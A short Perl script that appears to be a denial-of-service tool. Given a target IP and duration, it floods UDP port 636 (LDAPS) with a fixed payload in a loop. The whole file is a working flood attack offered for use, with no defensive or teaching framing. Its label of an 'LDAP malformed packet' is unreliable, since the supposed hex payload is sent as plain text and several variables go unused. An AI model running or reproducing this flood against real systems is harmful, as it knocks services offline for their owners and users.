#!/usr/bin/perl
# LDAP [malformed-packet]
use Socket;
use strict;
my ($ip,$time,$port,$config) = @ARGV;
my ($iaddr,$endtime,$psize,$pport,$size);
$size = "65507";
$psize = "65507";
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
for (;time() <= $endtime;) { #the line underthis is the echo hexadeciemal
send(flood, "0x7369786f6e6974666f726d6174696f6e61736c6470617773736f636b65742e636f6d", 0, pack_sockaddr_in("636", $iaddr));}